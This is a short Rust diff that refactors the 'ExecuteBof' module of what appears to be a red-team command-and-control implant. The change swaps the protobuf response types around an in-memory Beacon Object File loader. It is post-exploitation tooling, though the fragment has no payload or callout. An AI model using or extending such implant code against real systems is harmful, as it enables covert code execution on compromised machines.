@@ -1,12 +1,9 @@
 use crate::{check_request, Module, Result, TaskResult};
 use async_trait::async_trait;
-use malefic_helper::protobuf::implantpb::spite::Body;
-use malefic_helper::protobuf::implantpb::AssemblyResponse;
+use malefic_proto::proto::implantpb::spite::Body;
+use malefic_proto::proto::modulepb::BinaryResponse;
 use malefic_helper::win::kit::bof::bof_loader;
 use malefic_trait::module_impl;
-use prost::Message;
-use std::ffi::CString;
-use std::ptr::null;
 
 pub struct ExecuteBof {}
 
@@ -29,16 +26,17 @@ impl Module for ExecuteBof {
         } else {
             ep = Some(request.entry_point)
         }
-        let result: Vec<u8>;
+        let result: Vec<u8>; 
         unsafe {
             let ret = bof_loader(bin, args, ep);
-            result = ret.encode_to_vec();
+            result = ret.as_bytes().to_vec();
         }
 
         Ok(TaskResult::new_with_body(
             id,
-            Body::AssemblyResponse(AssemblyResponse {
+            Body::BinaryResponse(BinaryResponse {
                 status: 0,
+                message: Vec::new(),
                 data: result,
                 err: "".to_string(),
             }),
